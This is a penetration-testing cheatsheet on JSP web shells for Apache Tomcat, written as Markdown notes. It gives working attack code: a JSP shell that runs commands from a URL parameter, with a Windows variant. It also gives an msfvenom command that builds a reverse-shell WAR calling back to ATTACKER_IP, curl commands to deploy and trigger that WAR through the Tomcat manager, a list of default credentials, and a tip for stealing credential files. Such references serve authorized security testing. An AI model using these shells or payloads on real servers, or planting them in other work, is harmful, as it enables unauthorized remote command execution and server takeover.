---
tags: [pentest, shells, webshell, jsp, tomcat, java, initial-access, web]
type: cheatsheet
phase: 5
---
# JSP Web Shells (Tomcat)

Java Server Pages shells for Apache Tomcat and other Java application servers.

[[00 - README|Folder index]]

## Minimal JSP command execution

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
  Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
  out.println("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
}
%>
```

Usage: `http://target:8080/cmd.jsp?cmd=id`

## Windows variant

```jsp
<%
Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));
// ... same scanner pattern
%>
```

## WAR file deployment (Tomcat manager)

If you have Tomcat manager credentials:

```bash
# Create a WAR with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o revshell.war

# Deploy via curl
curl -u 'tomcat:tomcat' --upload-file revshell.war \
  "http://TARGET:8080/manager/text/deploy?path=/revshell"

# Trigger
curl http://TARGET:8080/revshell/
```

## Default Tomcat credentials to try

| Username | Password |
| --- | --- |
| tomcat | tomcat |
| admin | admin |
| manager | manager |
| tomcat | s3cret |
| role1 | tomcat |

> [!tip] Check tomcat-users.xml
> If you have LFI or file read, check `/etc/tomcat*/tomcat-users.xml` or `conf/tomcat-users.xml` for plaintext credentials.

## See also

- [[08 - PHP Web Shells]]
- [[10 - ASPX Web Shells]]
